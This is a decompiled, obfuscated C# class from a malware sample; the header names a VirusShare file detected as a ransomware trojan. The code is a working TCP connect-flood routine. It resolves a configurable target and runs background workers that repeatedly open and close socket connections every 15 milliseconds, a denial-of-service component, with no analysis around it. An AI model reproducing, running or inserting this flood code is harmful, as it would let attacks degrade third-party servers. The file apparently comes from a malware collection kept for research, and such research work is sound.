// Decompiled with JetBrains decompiler
// Type: ..
.
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fa05b3c64ba6163bb64b30062883b6f46b0f1c15f6c74963ec9341db78f63ddb.exe

using \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005
{
  internal class \u000E
  {
    private static IPEndPoint \u0003\u000C;
    private static BackgroundWorker[] \u0006\u0005;
    private static bool \u0010\u0008 = false;
    public static string \u000B\u0006\u0007\u000E\u0001 = string.Empty;
    public static ushort \u0009\u0001\u0011\u000A = 0;
    private static int \u0009\u000C\u0004 = 2;

    public static void \u0008\u0003\u0003\u000A\u000D()
    {
      try
      {
        \u000E.\u0003\u000C = new IPEndPoint(Dns.GetHostEntry(\u000E.\u000B\u0006\u0007\u000E\u0001).AddressList[0], (int) \u000E.\u0009\u0001\u0011\u000A);
      }
      catch
      {
        \u000E.\u0003\u000C = new IPEndPoint(IPAddress.Parse(\u000E.\u000B\u0006\u0007\u000E\u0001), (int) \u000E.\u0009\u0001\u0011\u000A);
      }
      \u000E.\u0006\u0005 = new BackgroundWorker[\u000E.\u0009\u000C\u0004];
      \u000E.\u0010\u0008 = true;
      for (int index = 0; index < \u000E.\u0009\u000C\u0004; ++index)
      {
        \u000E.\u0006\u0005[index] = new BackgroundWorker();
        \u000E.\u0006\u0005[index].DoWork += new DoWorkEventHandler(\u000E.\u0011\u0011);
        \u000E.\u0006\u0005[index].WorkerSupportsCancellation = true;
        \u000E.\u0006\u0005[index].RunWorkerAsync();
      }
    }

    public static void \u0003\u0004()
    {
      try
      {
        \u000E.\u0010\u0008 = false;
        for (int index = 0; index < \u000E.\u0009\u000C\u0004; ++index)
        {
          \u000E.\u0006\u0005[index].CancelAsync();
          \u000E.\u0006\u0005[index] = (BackgroundWorker) null;
        }
      }
      catch
      {
      }
    }

    private static void \u0011\u0011(object _param0, DoWorkEventArgs _param1)
    {
      while (\u000E.\u0010\u0008)
      {
        try
        {
          Socket state = new Socket(\u000E.\u0003\u000C.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
          state.BeginConnect((EndPoint) \u000E.\u0003\u000C, new AsyncCallback(\u000E.\u0001\u000A), (object) state);
          state.Blocking = false;
          state.Close();
          Thread.Sleep(15);
        }
        catch
        {
        }
      }
    }

    private static void \u0001\u000A(IAsyncResult _param0)
    {
    }
  }
}
